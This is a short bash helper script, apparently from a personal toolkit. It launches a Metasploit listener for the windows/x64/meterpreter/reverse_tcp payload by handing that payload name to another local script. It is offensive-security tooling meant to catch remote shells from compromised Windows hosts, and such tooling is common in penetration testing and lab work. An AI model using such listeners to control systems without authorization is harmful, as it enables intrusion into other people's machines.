#!/bin/bash

: '
meterpreter: start meterpreter listener windows/x64/meterpreter/reverse_tcp
'

PAYLOAD="windows/x64/meterpreter/reverse_tcp"
bash ~/Desktop/base/code/xdotool/scripts/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh "${PAYLOAD}"